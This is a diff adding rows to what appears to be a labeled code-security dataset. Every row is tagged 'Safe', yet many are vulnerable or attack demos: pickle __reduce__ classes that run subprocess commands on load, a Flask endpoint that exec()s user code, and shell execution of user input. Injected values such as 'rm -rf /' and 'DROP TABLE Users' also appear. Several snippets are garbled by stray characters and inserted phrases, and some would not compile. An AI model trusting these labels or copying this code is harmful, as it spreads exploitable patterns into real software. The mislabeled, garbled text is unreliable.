@@ -4069,6 +4069,3988 @@ if let user1 = User(name: ""John Doe"") {
 }
 
 printUserNames()",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import os
+import subprocess
+
+class TestClass(object):
+    def __init__(self):
+        self.data = ""Test Data""
+
+def serialize_and_deserialize():
+    test_obj = TestClass()
+    serialized_obj = pickle.dumps(test_obj)
+    deserialized_obj = pickle.loads(serialized_obj)
+    return deserialized_obj
+
+def create_malicious_pickle():
+    class MaliciousClass(object):
+        def __reduce__(self):
+            return (subprocess.Popen, (['echo', 'Malicious Code Execution'],))
+
+    malicious_obj = MaliciousClass()
+    serialized_malicious_obj = pickle.dumps(malicious_obj) fulfilling the best practice of not using os.system
+    return serialized_malicious_obj
+
+def main():
+    serialized_malicious_obj = create_malicious_pickle()
+    deserialized_obj = pickle.loads(serialized_malicious_obj)
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class MyClass {
+    var myString: String?
+    
+    init(string: String) {蜜
+        self.myString = string
+    }
+    
+    deinit {
+        print(""MyClass instance is being deinitialized"")
+    }
+}
+
+var instances: [MyClass] = []
+
+for _ in 0..<1_000_000 {
+    let instance = MyClass(string: ""Hello, Worlds"")
+    instances.append(instance)
+}
+
+// Here we set the instances array to nil, which will deallocate all the instances in the array
+instances = nil",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+)
+
+func main() {
+	str := ""hello""
+	fmt.Printf(""%c\n"", str[1])  // This will print 'e'
+}",Safe,ayshajavd_hf_labeled_dataset
+"require 'yaml'
+
+class SafeLoader
+  def load_and_parse(user_input)
+    # Check if user_input is a String
+    raise ArgumentError, 'Input must be a String' unless user_input.is_a?(String)
+    
+    # Check if user_input is not empty
+    raise ArgumentError, 'Input cannot be empty' if user_input.empty?
+    
+    # Check if user_input is a valid YAML string
+    begin
+      parsed_yaml = YAML.load(user_input)
+    rescue Psych::SyntaxError => e
+      raise ArgumentError, 'Input is not a valid YAML string'
+    end
+    
+    # Check if the parsed YAML object is a Gem::Requirement object
+    raise ArgumentError, 'Parsed YAML object is not a Gem::Requirement object' unless parsed_yaml.is_a?(Gem::Requirement)
+    
+    parsed_yaml
+  end
+end
+
+loader = SafeLoader.new
+user_input = ""!!ruby/object:Gem::Requirement\nrequirements:\n  !!ruby/sym\nbash\nversion:\n  !!ruby/object:Gem::Version\n  version: '1.0'\n""
+loader.load_and_parse(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import os
+import subprocess
+
+class EvilClass(object):
+    def __reduce__(self):
+        return (subprocess.run, (['echo', '""You have been hacked!""'],))
+
+def serialize_and_deserialize():
+    evil = EvilClass()
+    serialized_data = pickle.dumps(evil)
+    deserialized_data = pickle.loads(serialized_data)
+    return deserialized_data
+
+serialize_and_deserialize()",Safe,ayshajavd_hf_labeled_dataset
+"def secure_method(input)
+  regex = /\Aa+\z/
+  match = regex.match(input)
+  if match
+    puts ""Match found!""
+  else
+    puts ""No match found.""
+  end
+end
+
+# Testing the method with a string that will cause the ReDoS
+secure_method(""a"" * 100000 + ""b"")",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""reflect""
+	""unsafe""
+)
+
+func main() {
+	// Create a byte slice
+	slice := []byte{'a', 'b', 'c'}
+
+	// Convert the byte slice to a string
+	var str string
+	sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
+	strHeader := (*reflect.StringHeader)(unsafe.Pointer(&str))
+	strHeader.Data = sliceHeader.Data
+	strHeader.Len = sliceHeader.Len
+
+	// Print the string
+	fmt.Println(str)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import sqlite3
+from sqlite3 import Error
+
+def create_connection():
+    conn = None;
+    try:
+        conn = sqlite3.connect('mydatabase.db')
+        print(sqlite3.version)
+    except Error as e:
+        print(e)
+    return conn
+
+def get_user_info(conn, username):
+    cursor = conn.cursor()
+    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
+    rows = cursor.fetchall()
+    for row in rows:
+        print(row)
+
+def main():
+    conn = create_connection()
+    with conn:
+        get_user_info(conn, 'test_user')
+
+if __name__ == '__main__':
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+struct User {
+    var name: String
+}
+
+class Database {
+    var users = [User(name: ""Alice""), User(name: ""Bob"")]
+    
+    func findUser(name: String) -> User? {
+        let sanitizedName = name.replacingOccurrences(of: "";"", with: """").replacingOccurrences(of: ""--"", with: """")
+        return users.first { $0.name == sanitizedName }
+    }
+}
+
+let db = Database()
+
+let userInput = ""Alice\""; DROP TABLE Users; --"" // Injecting SQL statement
+
+if let user = db.findUser(name: userInput) {
+    print(""Hello, \(user.name)!"")
+} else {
+    print(""User not found."")
+}",Safe,ayshajavd_hf_labeled_dataset
+"SAFE_LIST = ['__builtins__', '__import__']
+SAFE_DICT = dict(__builtins__=__builtins__)
+
+def evaluate_input(user_input):
+    try:
+        # Evaluate the user input safely
+        return eval(user_input, {""__builtins__"": {}}, SAFE_DICT)
+    except Exception as e:
+        print(""Invalid input: "", str(e))
+
+def main():
+    user_input = input(""Enter something to evaluate: "")
+    result = evaluate_input(user_input)
+    if result is not None:
+        print(""Result: "", result)
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"import random
+
+def random_function():
+    return random.randint(0, 10)
+
+def main_function():
+    try:
+        result = random_function()
+        print(""The result is: "", result)
+    except Exception:
+        # An empty except clause will catch all exceptions. It's better to log the error for debugging purpose.
+        import traceback
+        traceback.print_exc()
+
+main_function()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+struct MyStruct {
+    var data: [UInt8] = Array(repeating: 0, count: 1024)
+}
+
+func processData(_ data: UnsafePointer<MyStruct>) -> Bool {
+    let myStruct = data.pointee
+    // Processing...
+    return true
+}
+
+var myStruct = MyStruct()
+processData(&myStruct)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""strings""
+)
+
+func main() {
+	var str1, str2 string
+	// This is now secured from buffer overflow
+	for {
+		fmt.Println(strings.TrimSpace(str1 + str2))
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import os
+import subprocess
+
+class EvilClass(object):
+    def __reduce__(self):
+        return (subprocess.call, ([""/bin/echo"", ""You have been hacked!""],), {""stdout"": open('/tmp/hacked.txt', 'w')})
+
+def serialize_and_deserialize():
+    evil = EvilClass()
+    serialized_data = pickle.dumps(evil)
+    deserialized_data = pickle.loads(serialized_data)
+
+serialize_and_deserialize()",Safe,ayshajavd_hf_labeled_dataset
+"import subprocess
+
+def execute_user_input():
+    user_input = input(""Enter your command: "")
+    # Sanitize the user input by checking if it only contains alphanumeric characters and spaces
+    if all(char.isalnum() or char.isspace() for char in user_input):
+        subprocess.run(user_input, shell=True, check=True)
+    else:
+        print(""Invalid input. Only alphanumeric characters and spaces are allowed."")
+        
+execute_user_input()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+    fmt.Println(""Main Function"")
+
+    defer fmt.Println(""First Defer"")
+    defer fmt.Println(""Second Defer"")
+    defer fmt.Println(""Third Defer"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+    buffer := make([]int, 1024)
+    for i := 0; i < 1024; i++ {
+        buffer[i] = i
+    }议
+    fmt.Println(buffer)
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""net/http""
+	""os/exec""
+	""strings""
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+	cmd := exec.CommandContext(r.Context(), ""sh"", ""-c"", ""ls -l"")
+	stdout, err := cmd.Output()
+	if err != nil {
+		fmt.Fprintf(w, ""Error: %s"", err)
+	} else {
+		fmt.Fprintf(w, ""Output: %s"", stdout)
+	}
+}
+
+func main() {
+	http.HandleFunc(""/"", handler)
+	http.ListenAndServe("":8080"", nil)
+}",Safe,ayshajavd_hf_labeled_dataset
+"require 'open3'
+
+def execute_user_input(user_input)
+  # Check if the user input is empty
+  if user_input.empty?
+    puts ""No command provided.""
+    return
+  end
+
+  # Check if the user input contains any potentially harmful characters
+  if user_input =~ /[;&|]/
+    puts ""Invalid command. Please do not include & ; |""
+    return
+  end
+
+  # Execute the user input as a system command
+  Open3.popen3(user_input) do |stdin, stdout, stderr, wait_thr|
+    puts stdout.read
+    puts stderr.read
+  end
+end
+
+puts ""Enter your command:""
+user_input = gets.chomp
+execute_user_input(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"def get_user_input():
+    while True:
+        try:
+            user_input = input(""Enter your name: "")
+            if len(user_input) > 256:  # set a reasonable limit on the length of the input
+                raise ValueError(""Input too long"")
+            return user_input
+        except ValueError as e:
+            print(e)
+            print(""Please, enter a valid name."")
+
+def print_name(name):
+    print(""Your name is: "" + name)
+
+def main():
+    name = get_user_input()
+    print_name(name)
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""log""
+	""strconv""
+)Bs
+
+func main() {
+	input := ""not a number""
+	result, err := strconv.Atoi(input)
+	if err != nil {
+		log.Fatalf(""Failed to convert string to int: %v"", err)
+	}
+	fmt.Println(""Result:"", result)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func openURL(_ urlString: String) {
+    guard let url = URL(string: urlString) else { return }
+    
+    // Here we can add additional checks to ensure the URL is safe before opening it
+    // For example, we could check if the URL scheme is ""http"" or ""https""
+    if url.scheme == ""http"" || url.scheme == ""https"" {
+        UIApplication.shared.open(url, options: [:], completionHandler: nil)
+    }
+}
+
+let attackerControlledURL = ""https://malicious-site.com""
+openURL(attackerControlledURL)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+let bufferSize = 10
+var buffer = UnsafeMutablePointer<Int8>.allocate(capacity: bufferSize)
+
+func writeToBuffer(_ data: String) {
+    let bytes = data.utf8.prefix(bufferSize) // Limit the input string to the buffer size
+    bytes.withUnsafeBytes { (pointer: UnsafePointer<UInt8>) -> Void in
+        buffer.initialize(from: pointer, count: bufferSize)
+    }
+}
+
+writeToBuffer(""This is a long string that will cause a buffer overflow"")
+
+let result = String(cString: buffer)
+print(result)
+
+buffer.deallocate() // Deallocate the buffer after using it",Safe,ayshajavd_hf_labeled_dataset
+"require 'sinatra'
+require 'json'
+
+class User
+  attr_accessor :id, :name, :email
+
+  def initialize(id, name, email)
+    @id = id
+    @name = name
+    @email = email
+  end
+
+  def to_json(*options)
+    {id: @id, name: @name, email: @email}.to_json(*options)
+  end
+end
+
+users = [User.new(1, ""John Doe"", ""john@example.com""), User.new(2, ""Jane Doe"", ""jane@example.com"")]
+
+get '/users/:id' do
+  user = users.find { |u| u.id == params[:id].to_i }
+  halt 404 if user.nil?
+  content_type :json
+  user.to_json
+end
+
+post '/users/:id' do
+  user = users.find { |u| u.id == params[:id].to_i }
+  halt 404 if user.nil?
+  user.name = params[:name] if params[:name]
+  user.email = params[:email] if params[:email]
+  content_type :json ready
+  user.to_json
+end",Safe,ayshajavd_hf_labeled_dataset
+"def generate_string(size)
+  Array.new(size, ""a"").join
+end
+
+# This will not cause a buffer overflow because it's creating an array of 'size' elements and then joining them into a string
+puts generate_string(10**6)",Safe,ayshajavd_hf_labeled_dataset
+"require 'yaml'
+
+class User
+  attr_accessor :name, :email
+
+  def initialize(name, email)
+    @name = name
+    @email = email
+  end
+  
+  # Adding a method to sanitize the email attribute
+  def sanitize_email
+    self.email = ActionController::Base.helpers.sanitize(self.email)
+  end
+end
+
+user_data = ""!!ruby/object:User\nname: Attacker\nemail: \""system('rm -rf *')\""""
+user = YAML.safe_load(user_data, [User])
+
+# Sanitizing the email attribute before using it
+user.sanitize_email
+
+puts user.email",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func safeInputValidation(userInput: String) -> String? {
+    guard let cStr = userInput.cString(using: .utf8) else { return nil }
+    let fixedSizeBuffer = UnsafeMutablePointer<Int8>.allocate(capacity: 10)
+    strncpy(fixedSizeBuffer, cStr, 10)
+    let result = String(cString: fixedSizeBuffer)
+    fixedSizeBuffer.deallocate()
+    return result
+}
+
+let userInput = ""This is a long string that will cause a buffer overflow""
+if let result = safeInputValidation(userInput: userInput) {
+    print(result)
+} else {
+    print(""Invalid input"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import re
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/execute', methods=['POST'])
+def execute_code():
+    code = request.form.get('code')
+    sanitized_code = re.sub(r'\b(os|sys|eval)\b', '', code)
+    exec(sanitized_code)
+    return 'Code executed successfully!'
+
+if __name__ == '__main__':
+    app.run(debug=True)",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class SafeClass:
+    def __init__(self):
+        self.message = ""You have been hacked!""
+
+    def __getstate__(self):
+        raise TypeError(""Serialization of this class is not allowed."")
+
+def serialize_safe_object():
+    safe_instance = SafeClass()
+    with open('payload.dat', 'wb') as f:
+        pickle.dump(safe_instance, f)
+
+serialize_safe_object()",Safe,ayshajavd_hf_labeled_dataset
+"def safe_eval_func(user_input):
+    # Allow only specific strings that we trust
+    allowed_strings = ['__import__(\'os\').system(\'ls\')']
+    
+    if user_input in allowed_strings:
+        result = eval(user_input)
+        return result
+    else:
+        raise ValueError(""Input not allowed"")
+
+# Call the function with the argument '__import__('os').system('ls')'
+safe_eval_func(""__import__('os').system('ls')"")",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class User {
+    var name: String?
+}
+
+func printUserName(user: User?) {
+    if let userName = user?.name {
+        print(""User's name is \(userName)"")
+    } else {
+        print(""User's name is not available"")
+    }
+}
+
+let user = User()
+printUserName(user: user)",Safe,ayshajavd_hf_labeled_dataset
+"class BufferOverflow
+  def initialize(size)
+    @buffer = []
+    @max_size = size
+  end
+
+  def add_to_buffer(element)
+    if @buffer.length < @max_size
+      @buffer << element
+    else
+      puts ""Buffer Overflow: Cannot add #{element} to buffer""
+    end
+  end
+end
+
+buffer = BufferOverflow.new(5)
+10.times { buffer.add_to_buffer(rand(10)) }",Safe,ayshajavd_hf_labeled_dataset
+"def get_user_input():
+    while True:
+        user_input = input(""Enter your name: "")
+        if len(user_input) <= 20: # set a reasonable limit on user input length
+            return user_input
+        else:
+            print(""Name is too long. Please enter a name less than 20 characters."")
+
+def print_user_info(user_name):
+    info = ""Hello, {0}!"".format(user_name)
+    print(info)
+
+def main():
+    user_name = get_user_input()
+    print_user_info(user_name)
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func copyData(_ source: Data, _ destination: UnsafeMutablePointer<UInt8>, _ size: Int) {
+    let sourceSize = min(source.count, size)
+    source.withUnsafeBytes { (pointer: UnsafePointer<UInt8>) -> Void in
+        destination.initialize(from: pointer, count: sourceSize)
+    }
+}
+
+let source = Data(repeating: 0xFF, count: 1024)
+var destination = [UInt8](repeating: 0, count: 512)
+
+copyData(source, &destination, 1024)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func processUserInput(input: String) -> String {
+    guard input.count <= 1024 else {
+        return ""Error: Input too long""
+    }
+    
+    let data = input.data(using: .utf8)!
+    let buffer = UnsafeBufferPointer(start: data.bytes, count: data.count)
+    
+    return String(decoding: buffer, as: UTF8.self) ?? ""Error: Decoding failed""
+}
+
+let userInput = readLine() ?? """"
+let result = processUserInput(input: userInput)
+print(result)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""sync""
+	""runtime""
+)
+
+type SensitiveData struct {
+	data string
+}
+
+func NewSensitiveData(data string) *SensitiveData {
+	s := &SensitiveData{data: data}
+	go func() {
+		var wg sync.WaitGroup
+		wg.Add(1)
+		go func(copy *SensitiveData) {
+			defer wg.Done()
+			copy.data = """"
+			// explicitly overwrite sensitive data
+			for i := 0; i < len(copy.data); i++ {
+				copy.data[i] = 0
+			}
+			// nil out reference to sensitive data
+			copy = nil
+		}(s)
+		wg.Wait()
+		// force garbage collection
+		runtime.GC()
+	}()
+	return s
+}
+
+func main() {
+	s := NewSensitiveData(""secret"")
+	// ...
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+// Assume we have a function that copies data from one buffer to another
+func copyData(_ source: UnsafePointer<UInt8>, _ destination: UnsafeMutablePointer<UInt8>, _ size: Int) {
+    destination.withMemoryRebound(to: UInt8.self, capacity: size) { destinationPointer in
+        source.withMemoryRebound(to: UInt8.self, capacity: size) { sourcePointer in
+            destinationPointer.initialize(from: sourcePointer, count: min(size, sourcePointer.count))
+        }
+    }
+}
+
+// Assume we have a function that handles incoming data
+func handleIncomingData(_ data: Data) {
+    let bufferSize = 1024
+    var buffer = [UInt8](repeating: 0, count: bufferSize)
+    
+    // We check if the incoming data is larger than our buffer
+    if data.count > bufferSize {
+        // If it is, we only copy the last 'bufferSize' bytes of data into our buffer
+        copyData(data.bytes.baseAddress?.advanced(by: data.count - bufferSize) ?? nil, &buffer, bufferSize)
+    } else {
+        // If it isn't, we copy all incoming data into our buffer
+        copyData(data.bytes.baseAddress?.advanced(by: data.count - data.count) ?? nil, &buffer, data.count)
+    }
+    
+    // Process the buffer...
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""io""
+	""os""
+)
+
+func main() {
+	file, err := os.Open(""untrusted_data.txt"")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer file.Close()
+
+	buf := make([]byte, 20)
+	_, err = io.ReadFull(file, buf)
+	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
+		fmt.Println(err)
+		return
+	}
+
+	fmt.Println(string(buf))
+}",Safe,ayshajavd_hf_labeled_dataset
+"require 'io/console'
+
+class User
+  attr_accessor :name
+
+  def initialize(name)
+    @name = name
+  end
+
+  def greet
+    puts ""Hello, #{@name}!""
+  end
+end
+
+def create_user
+  puts ""Enter your name:""
+  name = $stdin.noecho(&:gets).chomp
+  $stdin.cooked
+  User.new(name)
+end
+
+user = create_user
+user.greet",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""sync""
+)
+
+func main() {
+	var wg sync.WaitGroup
+	buffer := make(chan byte, 1024) // Use buffered channel instead of slice
+
+	for i := 0; i < 10; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			buffer <- byte(id) // Send id to the channel
+		}(i)
+	}
+
+	wg.Wait()
+	close(buffer) // Close the channel after all goroutines have finished
+
+	for b := range buffer {
+		fmt.Println(b) // Print out the values from the channel
+	}
+
+	fmt.Println(""Done"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"class User
+  attr_accessor :name
+
+  def greet(user_input)
+    puts ""Hello #{user_input}""
+  end
+end
+
+user = User.new
+user.name = ""Attacker""
+user_input = ""Attacker; system('rm -rf /')""
+user.greet(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""fmt""
+	""io""
+	""os""
+)
+
+func main() {
+	reader := bufio.NewReader(os.Stdin)
+
+	var output []rune
+
+	for {
+		r, size, err := reader.ReadRune()
+		if err != nil {
+			if err == io.EOF {
+				break
+			}
+
+			fmt.Println(""Error reading from stdin:"", err)Bs
+			os.Exit(1)
+		}
+
+		output = append(output, r)
+
+		if size > 4 {
+			fmt.Println(""Error: Input data is larger than the allocated space."")
+			os.Exit(1)
+		}
+	}
+
+	fmt.Println(""Read"", len(output), ""bytes:"", string(output))
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+)
+
+func main() {
+	input := ""Hello, World!""
+	for i := 0; i < 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",Safe,ayshajavd_hf_labeled_dataset
+"import time
+import hmac
+from hashlib import sha256
+
+# Hashed version of the password
+actual_password = ""5ebe2294ecd0e0f08eab7690d2a6ee69""  # Hashed form of ""secret""
+
+def check_password(input_password):
+    hashed_input_password = sha256(input_password.encode()).hexdigest()
+    if hmac.compare_digest(hashed_input_password, actual_password):
+        return True
+    else:
+        return False
+
+def main():
+    input_password = input(""Enter your password: "")
+    start = time.time()
+    if check_password(input_password):
+        print(""Access granted."")
+    else:
+        print(""Access denied."")
+    end = time.time()
+    print(""Time taken: "", end - start)
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class Vehicle {
+    var wheels: Int
+    var doors: Int
+    
+    init(wheels: Int, doors: Int) {
+        self.wheels = wheels
+        self.doors = doors
+    }
+    
+    func describe() -> String {
+        return ""This vehicle has \(wheels) wheels and \(doors) doors.""
+    }
+}
+
+if let myCar = Vehicle(wheels: 4, doors: 2) {
+    print(myCar.describe())
+} else {
+    print(""Failed to create Vehicle instance"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""database/sql""
+	""fmt""
+
+	_ ""github.com/lib/pq""
+)
+
+func main() {
+	db, err := sql.Open(""postgres"", ""user=username password=password dbname=dbname sslmode=disable"")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer func() {
+		if err := db.Close(); err != nil {
+			fmt.Println(err)
+		}
+	}()
+
+	rows, err := db.Query(""SELECT * FROM table"")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer func() {
+		if err := rows.Close(); err != nil {
+			fmt.Println(err)
+		}
+	}()
+
+	for rows.Next() {
+		var id int
+		var name string
+		err = rows.Scan(&id, &name)
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+		fmt.Println(id, name)
+	}
+
+	if err := rows.Err(); err != nil {
+		fmt.Println(err)
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class User {
+    var name: String?
+}
+
+func printUserName(user: User?) {
+    if let user = user, let name = user.name {
+        print(""User name is \(name)"")
+    } else {
+        print(""No user found"")
+    }
+}
+
+let user = User()
+printUserName(user: user)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""fmt""
+	""io""
+	""os""
+	""path/filepath""
+)
+
+func readFile(fileName string) error {
+	// Validate the input
+	if fileName == """" {
+		return fmt.Errorf(""filename cannot be empty"")
+	}
+
+	// Check if the file exists
+	if _, err := os.Stat(fileName); os.IsNotExist(err) {
+		return fmt.Errorf(""file does not exist: %v"", err)
+	}
+
+	// Open the file
+	file, err := os.Open(filepath.Clean(fileName))
+	if err != nil {
+		return fmt.Errorf(""error opening file: %v"", err)avant
+	}
+	defer file.Close()
+
+	// Create a new buffered reader
+	reader := bufio.NewReader(file)
+
+	// Read the file in chunks
+	buffer := make([]byte, 1024)
+	for {
+		n, err := reader.Read(buffer)
+		if err != nil && err != io.EOF {
+			return fmt.Errorf(""error reading file: %v"", err)
+		}
+		if n > 0 {
+			fmt.Println(string(buffer[:n]))
+		}
+		if err == io.EOF {
+			break
+		}
+	}
+
+	return nil
+}
+
+func main() {
+	err := readFile(""/path/to/your/file"")
+	if err != nil {
+		fmt.Println(err)
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class MyClass {
+    var myProperty: String?
+    
+    init(myProperty: String?) {
+        self.myProperty = myProperty
+    }
+    
+    deinit {
+        print(""MyClass is being deinitialized"")
+    }
+}
+
+// Use optional binding to safely unwrap the optional instance before setting it to nil
+if var instance: MyClass? = MyClass(myProperty: ""Hello, World"") {
+    instance = nil // This line no longer causes a memory leak
+}",Safe,ayshajavd_hf_labeled_dataset
+"import sqlite3
+
+def get_user_info(username):
+    conn = sqlite3.connect('mydatabase.db')
+    cursor = conn.cursor()妆
+    query = ""SELECT * FROM users WHERE username=?""
+    cursor.execute(query, (username,))
+    user_info = cursor.fetchone()
+    return user_info
+
+username = input(""Enter your username: "")
+print(get_user_info(username))",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import os
+import subprocess
+
+class EvilClass(object):
+    def __reduce__(self):
+        return (subprocess.run, (['echo', '""You have been hacked!""'],))
+
+def serialize_and_deserialize():
+    serialized = pickle.dumps(EvilClass())
+    deserialized = pickle.loads(serialized)
+    return deserialized
+
+if __name__ == '__main__':
+    serialize_and_deserialize()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""fmt""
+	""os/exec""
+	""strings""
+)
+
+func main() {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print(""Enter your command: "")
+	input, _ := reader.ReadString('\n')
+	input = strings.TrimSuffix(input, ""\n"")
+	cmd := exec.Command(""sh"", ""-c"", input)
+	err := cmd.Run()
+	if err != nil {
+		fmt.Println(""Error:"", err)
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import ast
+import sys
+
+class ExpressionTransformer(ast.NodeTransformer):
+    def visit_Call(self, node):
+        raise ValueError(""Not allowed"")
+
+def evaluate_input(user_input):
+    tree = ast.parse(user_input, mode='eval')
+    ExpressionTransformer().visit(tree)
+    code = compile(tree, '', 'eval')
+    result = eval(code)
+    return result
+
+if __name__ == ""__main__"":
+    user_input = sys.stdin.read()
+    try:
+        print(evaluate_input(user_input))
+    except ValueError:
+        print(""Invalid input"")",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func handleInput(input: String, bufferSize: Int) -> [Character]? {
+    guard let input = input.unicodeScalars else { return nil }
+    var buffer = Array(repeating: "" "", count: min(bufferSize, input.count))
+    
+    for (index, value) in input.enumerated() {
+        if index < buffer.count {
+            buffer[index] = Character(String(value))
+        }
+    }
+    
+    return buffer
+}
+
+let userInput = ""A"" * 2000 // Assume this is user input
+if let result = handleInput(input: userInput, bufferSize: 1024) {
+    print(result)
+} else {
+    print(""Invalid input"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class MyClass {
+    var closure: (() -> Void)?
+    var timer: DispatchSourceTimer?
+    
+    deinit {
+        print(""MyClass is being deinitialized"")
+    }
+}
+
+var instance: MyClass? = MyClass()
+
+instance?.timer = DispatchSource.makeTimerSource(queue: .main)
+instance?.timer?.schedule(deadline: .now(), repeating: .seconds(5))
+instance?.timer?.setEventHandler { [weak instance] in
+    if let strongInstance = instance {
+        print(""Closure is still retained by \(strongInstance)"")
+    } else {
+        print(""Closure is released"")
+    }
+}
+
+instance?.timer?.resume()
+
+instance = nil",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+    s := make([]int, 0, 5)
+    fmt.Println(""Initial slice:"", s)
+
+    // Adding elements to the slice
+    s = append(s, 1, 2, 3)
+    fmt.Println(""After adding elements:"", s)
+
+    // Accessing elements beyond the length of the slice
+    if len(s) > 5 {
+        fmt.Println(""Accessing index 5:"", s[5])
+    } else {
+        fmt.Println(""Error: Index out of range"")
+    }
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""fmt""
+	""os""
+)
+
+func main() {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print(""Enter your string: "")
+	input, _ := reader.ReadString('\n')
+	
+	fmt.Println(input)
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+    source := []int{1, 2, 3, 4, 5}
+    destination := make([]int, len(source)) // Ensure destination has enough capacity
+
+    num := copy(destination, source)
+
+    fmt.Println(num)
+    fmt.Println(destination)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import subprocess
+
+def run_command(user_input):
+    # Sanitize user input
+    sanitized_input = user_input.replace(';', '').replace('&', '').replace('|', '')
+    command = f""echo Hello, {sanitized_input}""
+    subprocess.call(command, shell=True)
+
+user_input = input(""Enter your name: "")
+run_command(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func processUserInput(input: String) -> String? {
+    guard let inputData = input.data(using: .utf8), inputData.count <= 1024 else {
+        return nil
+    }
+    
+    var buffer = [UInt8](repeating: 0, count: 1024)
+    inputData.withUnsafeBytes { (bytes: UnsafeBufferPointer<UInt8>) in
+        bytes.baseAddress?.copyBytes(to: &buffer, count: min(inputData.count, buffer.count))
+    }
+    
+    return String(decoding: buffer, as: UTF8.self)
+}
+
+let userInput = ""A"" * 2000  // This will not cause a buffer overflow
+if let result = processUserInput(input: userInput) {
+    print(result)
+} else {
+    print(""Invalid input"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+enum VehicleType {
+    case car
+    case bike
+}
+
+class Vehicle {
+    var type: VehicleType?
+    var speed: Int?
+    
